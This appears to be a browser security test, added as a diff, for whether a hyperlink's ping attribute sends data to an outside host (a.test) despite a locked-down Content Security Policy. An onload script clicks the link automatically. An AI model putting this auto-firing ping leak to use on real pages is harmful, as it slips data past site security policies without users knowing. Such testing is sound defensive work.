@@ -1,0 +1,13 @@
+<head>
+<meta http-equiv="content-security-policy" content="default-src 'none'; script-src 'unsafe-inline';">
+</head>
+<html>
+  <body>
+    <a id="a" href="#done" ping="https://a.test/report/?leak=c560695-GenAI2-CSP">click here to exploit</a>
+    <script>
+      window.onload = function () {
+        document.getElementById("a").click();
+      };
+    </script>
+  </body>
+</html>
